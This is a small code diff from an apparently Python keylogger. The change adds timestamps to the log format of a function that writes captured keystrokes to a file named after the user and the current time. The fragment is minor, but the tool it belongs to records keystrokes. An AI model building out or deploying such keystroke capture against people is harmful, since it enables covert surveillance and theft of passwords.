@@ -6,7 +6,7 @@ from user_name import user_name
 
 def key_logger():
 
-    logging.basicConfig(filename="keylog-"+user_name()+current_time()+".txt", level=logging.INFO, format="%(message)s")
+    logging.basicConfig(filename="keylog-"+user_name()+current_time()+".txt", level=logging.INFO, format="%(asctime)s: %(message)s")
 
     # define a callback function to process the keystrokes
     def on_key_press(event):
